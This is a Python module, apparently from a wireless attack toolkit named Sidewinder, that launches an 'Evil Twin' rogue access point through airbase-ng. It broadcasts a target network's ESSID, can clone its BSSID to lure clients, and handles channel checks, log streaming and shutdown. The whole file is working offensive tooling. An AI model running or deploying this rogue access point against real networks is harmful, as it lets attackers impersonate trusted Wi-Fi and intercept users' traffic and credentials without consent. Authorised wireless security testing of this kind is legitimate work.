"""Sidewinder Evil Twin Attack Module.

Spins up a rogue Access Point (Evil Twin) with the same ESSID as the target to lure clients.
Uses airbase-ng under the hood to handle beacon injection and client association handling.
"""
from __future__ import annotations

import asyncio
import inspect
import logging
from typing import Awaitable, Callable, Optional

from ..core.subprocess_mgr import SubprocessManager, get_manager

logger = logging.getLogger(__name__)


class EvilTwinEngine:
    """Manages the Evil Twin rogue AP lifecycle."""

    def __init__(self, mgr: Optional[SubprocessManager] = None) -> None:
        self.mgr = mgr or get_manager()
        self._proc: Optional[asyncio.subprocess.Process] = None
        self._running = False
        self._read_task: Optional[asyncio.Task] = None

    async def start_rogue_ap(
        self,
        mon_iface: str,
        essid: str,
        channel: int,
        target_bssid: Optional[str] = None,
        on_log: Optional[Callable[[str], Awaitable[None] | None]] = None,
        timeout: float = 3600.0,
    ) -> None:
        """Start a rogue Access Point using airbase-ng.
        
        Args:
            mon_iface: The monitor mode interface.
            essid: The ESSID (network name) to broadcast.
            channel: The channel to broadcast on (1-165).
            target_bssid: Optional BSSID to clone.
            on_log: Callback for streaming output logs (can be async).
            timeout: Max seconds to run the rogue AP before auto-stopping.
        """
        if not (1 <= channel <= 14 or 36 <= channel <= 165):
            from ..core.errors import SidewinderError, Severity, Category
            raise SidewinderError(
                severity=Severity.ERROR,
                category=Category.USER,
                what="Invalid channel for Evil Twin",
                why=f"Channel {channel} is not a valid 2.4GHz or 5GHz channel.",
                how_to_fix=["Select a valid channel from the scan results."],
            )

        cmd = [
            "airbase-ng",
            "-e", essid,
            "-c", str(channel),
        ]
        
        if target_bssid:
            cmd.extend(["-a", target_bssid])
            
        cmd.append(mon_iface)
        
        logger.info("Starting Evil Twin (ESSID: %s, Channel: %d) on %s", essid, channel, mon_iface)
        
        async def safe_log(msg: str) -> None:
            if on_log:
                res = on_log(msg)
                if inspect.isawaitable(res):
                    await res

        await safe_log(f"[*] Initializing Rogue AP: {essid} (Ch {channel})")
        if target_bssid:
            await safe_log(f"[*] Cloning BSSID: {target_bssid}")
                
        self._proc = await self.mgr.start_background(cmd)
        self._running = True

        async def _read_stdout():
            try:
                assert self._proc and self._proc.stdout
                async for line_b in self._proc.stdout:
                    if not self._running:
                        break
                    line = line_b.decode(errors="replace").rstrip()
                    if not line:
                        continue
                    await safe_log(line)
            except Exception as e:
                logger.error("Evil twin output error: %s", e)
                await safe_log(f"[!] Rogue AP error: {e}")

        self._read_task = asyncio.create_task(_read_stdout())
        
        try:
            await asyncio.wait_for(self._proc.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            logger.warning("Evil Twin timed out after %ds", int(timeout))
            await safe_log("[!] Evil Twin timed out")
        finally:
            await self.stop()

    async def stop(self) -> None:
        """Gracefully stop the rogue AP."""
        if not self._running:
            return
        self._running = False
        if self._proc:
            await self.mgr.kill_background(self._proc)
            self._proc = None
        if self._read_task:
            self._read_task.cancel()
            self._read_task = None
        logger.info("Evil Twin stopped.")
